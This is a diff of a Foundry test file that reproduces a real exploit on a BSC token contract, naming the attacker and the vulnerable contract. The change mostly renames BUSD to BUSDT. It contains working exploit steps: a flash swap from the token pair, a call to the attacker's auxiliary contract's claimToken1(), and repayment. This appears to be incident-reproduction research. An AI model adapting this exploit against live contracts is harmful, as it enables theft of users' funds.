@@ -4,7 +4,7 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-// @KeyInfo - Total Lost : ~127K BUSD
+// @KeyInfo - Total Lost : ~127K BUSDT
 // Attacker : 0x3DF6cd58716d22855aFb3B828F82F10708AfbB4f
 // Attack Contract : https://bscscan.com/address/0xd7ba198ce82f4c46ad8f6148ccfdb41866750231
 // Vulnerable Contract : https://bscscan.com/address/0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c
@@ -27,9 +27,9 @@ import "./interface.sol";
 contract ContractTest is Test {
     IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 constant ATK_TOKEN = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
-    IERC20 constant BUSD_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
     Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    Uni_Pair_V2 constant ATK_BUSD_PAIR = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
+    Uni_Pair_V2 constant ATK_BUSDT_PAIR = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
     address constant EXPLOIT_CONTRACT = 0xD7ba198ce82f4c46AD8F6148CCFDB41866750231;
     address constant EXPLOIT_AUX_CONTRACT = 0x96bF2E6CC029363B57Ffa5984b943f825D333614;
 
@@ -40,9 +40,9 @@ contract ContractTest is Test {
         // Adding labels to improve stack traces' readability
         vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
         vm.label(address(ATK_TOKEN), "ATK_TOKEN");
-        vm.label(address(BUSD_TOKEN), "BUSD_TOKEN");
+        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
         vm.label(address(PS_ROUTER), "PS_ROUTER");
-        vm.label(address(ATK_BUSD_PAIR), "ATK_BUSD_PAIR");
+        vm.label(address(ATK_BUSDT_PAIR), "ATK_BUSDT_PAIR");
         vm.label(EXPLOIT_CONTRACT, "EXPLOIT_CONTRACT");
         vm.label(EXPLOIT_AUX_CONTRACT, "EXPLOIT_AUX_CONTRACT");
     }
@@ -53,10 +53,10 @@ contract ContractTest is Test {
         );
 
         WBNB_TOKEN.deposit{value: 2 ether}();
-        _WBNBToBUSD();
+        _WBNBToBUSDT();
 
-        swapamount = BUSD_TOKEN.balanceOf(address(ATK_BUSD_PAIR)) - 3 * 1e18;
-        ATK_BUSD_PAIR.swap(swapamount, 0, address(this), new bytes(1));
+        swapamount = BUSDT_TOKEN.balanceOf(address(ATK_BUSDT_PAIR)) - 3 * 1e18;
+        ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "[End] Attacker ATK balance after exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
@@ -77,18 +77,18 @@ contract ContractTest is Test {
         (bool success,) = EXPLOIT_AUX_CONTRACT.call(abi.encodeWithSignature("claimToken1()"));
         require(success, "Call `claimToken1()` failed");
 
-        // Return the BUSD to the ATK_BUSD_PAIR
-        BUSD_TOKEN.transfer(address(ATK_BUSD_PAIR), swapamount * 10_000 / 9975 + 1000);
+        // Return the BUSDT to the ATK_BUSDT_PAIR
+        BUSDT_TOKEN.transfer(address(ATK_BUSDT_PAIR), swapamount * 10_000 / 9975 + 1000);
     }
 
     /**
-     * Auxiliary function to swap all WBNB to BUSD
+     * Auxiliary function to swap all WBNB to BUSDT
      */
-    function _WBNBToBUSD() internal {
+    function _WBNBToBUSDT() internal {
         WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(WBNB_TOKEN);
-        path[1] = address(BUSD_TOKEN);
+        path[1] = address(BUSDT_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
